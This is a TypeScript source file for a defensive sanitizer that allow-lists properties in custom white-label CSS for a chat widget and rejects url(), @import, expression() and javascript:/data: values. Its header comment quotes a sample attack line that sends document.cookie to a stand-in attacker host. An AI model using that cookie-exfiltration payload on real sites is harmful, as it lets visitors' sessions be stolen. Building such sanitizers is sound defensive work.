/**
 * White-label CSS sanitizer.
 *
 * Custom CSS is stored verbatim and inlined into the customer's widget.
 * Without an allow-list, an attacker can use `background: url('//attacker/?x='+document.cookie)`
 * to exfiltrate visitor cookies, or use `@import` to pull in CSS that
 * corrupts the chat UI.
 *
 * This helper enforces a per-declaration allow-list:
 *   - Only safe visual properties (color, background-color, font-family, ...)
 *   - No url(), no @import, no @charset, no expression()
 *   - Block comments stripped so they can't hide disallowed rules
 */
const ALLOWED_PROPS = new Set([
  "color",
  "background-color",
  "font-family",
  "font-size",
  "font-weight",
  "font-style",
  "line-height",
  "letter-spacing",
  "text-align",
  "text-decoration",
  "text-transform",
  "border-radius",
  "border-top-left-radius",
  "border-top-right-radius",
  "border-bottom-left-radius",
  "border-bottom-right-radius",
  "border-width",
  "border-style",
  "border-color",
  "border-top",
  "border-right",
  "border-bottom",
  "border-left",
  "padding",
  "padding-top",
  "padding-right",
  "padding-bottom",
  "padding-left",
  "margin",
  "margin-top",
  "margin-right",
  "margin-bottom",
  "margin-left",
  "opacity",
  "box-shadow",
  "max-width",
  "min-width",
  "max-height",
  "min-height",
  "width",
  "height",
  "display",
  "visibility",
]);

const FORBIDDEN_PATTERNS = [
  /\burl\s*\(/i,             // url(...)
  /@import/i,                // @import
  /@charset/i,               // @charset
  /expression\s*\(/i,        // IE expression()
  /behavior\s*:/i,           // IE behavior:
  /javascript\s*:/i,         // javascript: protocol
  /data\s*:/i,               // data: protocol (could leak data via background)
  /<!--/,                    // HTML comment in CSS
];

/**
 * Returns the sanitized CSS or null if nothing valid remains.
 * Throws if any forbidden pattern is present.
 */
export function sanitizeWhiteLabelCss(input: string): string | null {
  if (!input) return null;

  // Quick reject: any forbidden pattern fails the whole input.
  for (const re of FORBIDDEN_PATTERNS) {
    if (re.test(input)) {
      throw new Error("CSS contains disallowed content");
    }
  }

  // Strip /* */ comments so they can't smuggle disallowed rules.
  const stripped = input.replace(/\/\*[\s\S]*?\*\//g, "");

  const out: string[] = [];
  for (const rawDecl of stripped.split(";")) {
    const decl = rawDecl.trim();
    if (!decl) continue;
    const colonIdx = decl.indexOf(":");
    if (colonIdx < 0) continue;

    const prop = decl.slice(0, colonIdx).trim().toLowerCase();
    const value = decl.slice(colonIdx + 1).trim();

    if (!ALLOWED_PROPS.has(prop)) continue;

    // Reject values containing url() / expression() / etc. even after split.
    if (FORBIDDEN_PATTERNS.some((re) => re.test(value))) {
      throw new Error(`CSS value for ${prop} contains disallowed content`);
    }

    out.push(`${prop}: ${value}`);
  }

  if (out.length === 0) return null;
  return out.join("; ") + ";";
}